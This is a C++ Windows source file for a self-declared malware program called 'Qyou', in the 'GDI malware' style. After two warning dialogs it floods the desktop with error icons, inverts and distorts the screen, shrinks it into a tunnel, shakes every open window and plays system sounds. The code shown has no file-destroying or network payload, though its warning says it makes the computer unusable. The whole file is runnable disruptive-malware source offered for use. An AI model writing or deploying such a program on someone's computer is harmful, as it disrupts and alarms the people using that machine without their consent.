#include <iostream>
//#include "windows.h"
#include <tchar.h>
#include <windows.h>
#include <time.h> 
#define _USE_MATH_DEFINES 1
#include <cmath>
#pragma comment(lib, "winmm.lib")
void Icons() {
	HDC desk = GetDC(0); //why 2
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int i = 1;
	while (i <= 38) {
		desk = GetDC(0); //why 2?
		int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;
		for (int t = 0; t < sw + sh; ++t) {
			// Very cool float, ngl LMFAOOOO
			int x = (int)(float)(radius + t * tan(t + radius * 3) + rx),
				y = (int)(float)(radius + t * cos(t + radius * 3) + ry);
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_WARNING)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_WINLOGO)); Sleep(0.99); }
		}
		InvalidateRect(0, 0, 0);i++;
	}
}

void Mlt() {
	time_t t;
	srand((unsigned)time(&t));
	PlaySound(TEXT("C:\\Windows\\Media\\windows Error.wav"), NULL, SND_FILENAME | SND_ASYNC);
	HDC screenDC = GetDC(NULL);
	int scrWidth = GetDeviceCaps(screenDC, HORZRES);
	int scrHeight = GetDeviceCaps(screenDC, VERTRES);
	int i = 1;
	int x;
	while (i <= 699) {
		HDC screenDC = GetDC(NULL);
		x = rand() % scrWidth;
		BitBlt(screenDC, x, 1, 9000, scrHeight, screenDC, x, 0, SRCCOPY);
		Sleep(2); i++;
	}
}

void payload1() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int i = 1;
	while (i <= 120) {
		desk = GetDC(0);
		StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY);
		Sleep(150);
		i++;

	}

}
void Bgm() {
	PlaySound(TEXT("C:\Windows\Media\\Windows Logon.wav"), NULL, SND_FILENAME | SND_ASYNC);
	Sleep(-1);
}

void Plaload() {
	HDC hdc = 0;
	int sx = 2, sy = 3;
	int rx = 2, ry = 0;
	int i = 1;
	while (i <= 120)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225)));
		PatBlt(hdc, 0, 0, sx, sy, PATINVERT);
		Sleep(10);
		i++;
	}
}

void StartShake()
{
	srand((unsigned)time(NULL));
	int sysX, sysY;
	sysX = GetSystemMetrics(SM_CXSCREEN);//get screen width
	sysY = GetSystemMetrics(SM_CYSCREEN);//get screen height
	int i = 1;
	while (i <= 100)
	{
		HWND hWnd = GetDesktopWindow();//get desktop handle
		for (hWnd = GetWindow(hWnd, GW_CHILD); hWnd; hWnd = GetWindow(hWnd, GW_HWNDNEXT))
		{
			RECT rect;

			long style = GetWindowLong(hWnd, GWL_STYLE);//get window type
			if (style & WS_VISIBLE)//window visible
			{
				GetWindowRect(hWnd, &rect);//Get window rectangle coordinates
				int posX, posY, cX, cY;
				bool flag = !(rand() % 2);

				cX = rect.right - rect.left;
				cY = rect.bottom - rect.top;

				//Generate new window coordinates
				if (flag)
				{
					posX = rect.left + rand() % 20 * 5;
					posY = rect.top + rand() % 10 * 5;
				}
				else
				{
					posX = rect.left - rand() % 20 * 5;
					posY = rect.top - rand() % 10 * 5;
				}

				//border judgment
				if (posX < 0)	posX = 0;
				if (posY < 0)	posY = 0;
				if (posX + cX > sysX)
					posX = sysX - cX;
				if (posY + cY > sysY)
					posY = sysY - cY;

				//set window position
				SetWindowPos(hWnd, HWND_NOTOPMOST, posX, posY, rect.right - rect.left,
					rect.bottom - rect.top, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOACTIVATE);
			}
		}
		i++;
	}
}

void Plaload4() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int i = 1;
	while (i <= 5) {
		desk = GetDC(0);
		int x1 = (rand() % sw - 400);
		int y1 = (rand() % sw - 400);
		int x2 = (rand() % sw - 400);
		int y2 = (rand() % sw - 400);
		int w = (rand() % 400);
		int h = (rand() % 400);
		BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? SRCERASE : NOTSRCERASE);
		BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? NOTSRCCOPY : SRCPAINT);
		BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? SRCCOPY : SRCAND);i++;
		Sleep(150);
		
	}
}

void payload5() { //im lazy, hep
	int i = 1;
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	
	while (i <= 7) {
		desk = GetDC(0);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255))); //epic gdi leak
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(1000);
		i++;
	}

}

void Icon4() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int i = 1;
	while (i <= 10) {
		desk = GetDC(0);
		int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;
		for (int t = 0; t < sw + sh; ++t) {
			int x = (int)(float)(radius + t * tan(t + radius * 3) + rx), //eeeeeeeeeeeeeeee
				y = (int)(float)(radius + t * cos(t + radius * 3) + ry);
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_WARNING)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_INFORMATION)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_INFORMATION)); Sleep(0.99); }
			if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ASTERISK)); Sleep(0.99); }
		}
		InvalidateRect(0, 0, 0); i++;
	}
}

void Icons3() {
	int i = 1;
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	POINT point;
	while (i <= 80)
	{
		GetCursorPos(&point);
		DrawIcon(hdc, point.x + 25, point.y + 25, LoadIcon(NULL, IDI_QUESTION));
		DrawIcon(hdc, point.x + 50, point.y + 50, LoadIcon(NULL, IDI_WARNING));
		DrawIcon(hdc, point.x - 5, point.y - 5, LoadIcon(NULL, IDI_ERROR));
		DrawIcon(hdc, point.x - 30, point.y - 30, LoadIcon(NULL, IDI_INFORMATION));
		DrawIcon(hdc, point.x - 60, point.y - 60, LoadIcon(NULL, IDI_WINLOGO));
		Sleep(1);
			i++;
	}
}

void Desk() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int i = 1;
	while (i <= 10) {
		desk = GetDC(0);
		int x1 = (rand() % sw - 400);
		int y1 = (rand() % sw - 400);
		int x2 = (rand() % sw - 400);
		int y2 = (rand() % sw - 400);
		int w = (rand() % 400);
		int h = (rand() % 400);
		BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? SRCERASE : NOTSRCERASE);
		BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? NOTSRCCOPY : SRCPAINT);
		BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? SRCCOPY : SRCAND);
		Sleep(150);
		i++;
	}
}

void WARNING() {
	if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
Qyou  by  Synth_Cir", L"Qyou", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Qyou", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
	}
}

//#include <time.h>
void Tunnel() {
	FreeConsole();
	int i = 1;
	int a, b;
	while (i <= 20) {
		a = GetSystemMetrics(SM_CXSCREEN);
		b = GetSystemMetrics(SM_CYSCREEN);
		StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
		Sleep(2000);
		i++;
	}
}

int main()
{
	WARNING();
    Icons();
	//Bgm();
	Mlt();
	payload1();
	Plaload();
	Tunnel();
	Icons3();
	Desk();	
	Plaload4();
	Icon4();
	payload5();
	StartShake();
	int i = 1;
	while (i <= 89)
	{
		std::cout << "███";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		std::cout << "███";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
		std::cout << "██";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		std::cout << "██";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
		std::cout << "██";
		Icons3();
		i++;
		
	}
}